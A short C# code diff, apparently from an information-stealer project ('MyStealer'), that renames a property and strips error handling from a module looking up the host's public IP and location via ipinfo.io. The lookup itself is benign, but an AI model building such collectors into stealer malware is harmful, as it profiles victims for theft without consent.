@@ -9,29 +9,21 @@ namespace MyStealer.Collector.Ip
     /// </summary>
     public class IpInfoIoProvider : ApiProviderBase
     {
-        public override string ModuleName => "ipinfo.io";
+        public override string Name => "ipinfo.io";
 
         public override Uri ApiUrl => new Uri("https://ipinfo.io/json");
 
         public override IpDetails Parse(string response)
         {
-            try
-            {
-                var obj = JObject.Parse(response);
+            var obj = JObject.Parse(response);
 
-                return new IpDetails
-                {
-                    Address = IPAddress.Parse(obj["ip"].Value<string>()),
-                    CountryCode = obj["country"].Value<string>(),
-                    RegionName = obj["region"].Value<string>(),
-                    City = obj["city"].Value<string>()
-                };
-            }
-            catch (Exception ex)
+            return new IpDetails
             {
-                Logger.Error(ex, "Error parsing api response.");
-                return IpDetails.Empty;
-            }
+                Address = IPAddress.Parse(obj["ip"].Value<string>()),
+                CountryCode = obj["country"].Value<string>(),
+                RegionName = obj["region"].Value<string>(),
+                City = obj["city"].Value<string>()
+            };
         }
     }
 }
